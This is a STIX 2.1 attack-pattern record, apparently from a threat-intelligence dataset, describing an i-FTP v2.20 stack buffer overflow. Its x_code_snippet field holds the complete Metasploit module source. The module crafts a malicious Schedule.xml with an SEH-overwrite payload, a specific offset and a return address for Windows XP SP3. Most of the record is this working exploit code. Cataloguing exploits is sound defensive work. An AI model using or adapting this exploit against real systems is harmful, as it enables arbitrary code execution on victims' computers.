{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--129d3b4e-b7b4-45c4-924c-b27bfbf3a216",
    "created": "2024-08-14T16:35:54.488904Z",
    "modified": "2024-08-14T16:35:54.488908Z",
    "name": "i-FTP Schedule Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in i-Ftp v2.20, caused by a long time value set for scheduled download.  By persuading the victim to place a specially-crafted Schedule.xml file in the i-FTP folder, a remote attacker could execute arbitrary code on the system or cause the application to crash. This module has been tested successfully on Windows XP SP3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/iftp_schedule_bof.rb",
            "external_id": "iftp_schedule_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'i-FTP Schedule Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        i-Ftp v2.20, caused by a long time value set for scheduled download.\n\n        By persuading the victim to place a specially-crafted Schedule.xml file\n        in the i-FTP folder, a remote attacker could execute arbitrary code on\n        the system or cause the application to crash. This module has been\n        tested successfully on Windows XP SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'metacom',      # Vulnerability discovery and PoC\n          'Gabor Seljan'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '35177' ],\n          [ 'OSVDB', '114279' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x0a\\x0d\\x20\\x22\",\n          'Space'      => 2000\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3',\n            {\n              'Offset' => 600,\n              'Ret'    => 0x1001eade  # POP ECX # POP ECX # RET [Lgi.dll]\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-11-06',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.', 'Schedule.xml'])\n        ],\n      self.class)\n\n  end\n\n  def exploit\n\n    evil =  rand_text_alpha(target['Offset'])\n    evil << generate_seh_payload(target.ret)\n    evil << rand_text_alpha(20000)\n\n    xml = Document.new\n    xml << XMLDecl.new('1.0', 'UTF-8')\n    xml.add_element('Schedule', {})\n    xml.elements[1].add_element(\n      'Event',\n      {\n        'Url' => '',\n        'Time' => 'EVIL',\n        'Folder' => ''\n      })\n\n    sploit = ''\n    xml.write(sploit, 2)\n    sploit = sploit.gsub(/EVIL/, evil)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-06",
    "x_mitre_platforms": [
        "win'"
    ]
}